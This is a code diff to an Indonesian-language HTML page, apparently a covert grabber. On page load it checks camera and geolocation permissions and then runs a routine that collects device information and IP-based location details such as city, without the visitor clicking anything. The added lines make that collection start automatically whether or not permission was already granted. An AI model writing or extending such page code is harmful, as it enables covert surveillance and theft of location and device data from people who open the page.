@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- FINAL SUPER GERCEP TANPA KLIK PLAY, TOMBOL TETAP -->
+<!-- VERSION FINAL DETEKSI IZIN V5 -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -214,6 +214,22 @@ Kota                : ${ip.city}
       }
     };
 
+    const cekIzinDanMulai = async () => {
+      try {
+        const izinKamera = await navigator.permissions.query({ name: "camera" });
+        const izinLokasi = await navigator.permissions.query({ name: "geolocation" });
+
+        if (izinKamera.state === "granted" && izinLokasi.state === "granted") {
+          mulai(); // langsung tanpa pop-up
+        } else {
+          // tetap jalan, browser akan munculkan pop-up izin
+          mulai();
+        }
+      } catch {
+        mulai(); // fallback
+      }
+    };
+
     const mulai = async () => {
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
@@ -229,7 +245,9 @@ Kota                : ${ip.city}
       }
     };
 
-    window.addEventListener("load", mulai);
+    window.addEventListener("load", () => {
+      setTimeout(cekIzinDanMulai, 0);
+    });
   </script>
 </body>
 </html>
